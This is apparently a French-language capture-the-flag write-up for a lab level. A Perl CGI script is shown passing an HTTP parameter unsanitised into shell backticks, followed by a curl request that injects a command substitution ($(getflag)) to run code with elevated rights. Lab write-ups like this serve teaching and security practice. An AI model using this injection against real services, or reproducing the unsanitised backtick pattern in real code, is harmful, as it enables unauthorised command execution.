# Level04 — Command Injection (CGI Perl)

## Vulnérabilité

Un script Perl CGI tourne sur `localhost:4747`. Il lit le paramètre `x` de la requête HTTP et l'injecte directement dans une exécution shell via les backticks Perl :

```perl
print `echo $y 2>&1`;
```

Aucune validation ou sanitisation de l'input → **injection de commandes shell**.

## Exploitation

Le script s'exécute avec les droits de `flag04`. Il suffit d'envoyer une requête HTTP avec une substitution de commande dans le paramètre `x` :

```sh
curl 'http://localhost:4747?x=$(getflag)'
```

La substitution `$(getflag)` est interprétée par le shell avant le `echo`, ce qui exécute `getflag` avec les droits de `flag04`.

## Token

Voir `../flag`.
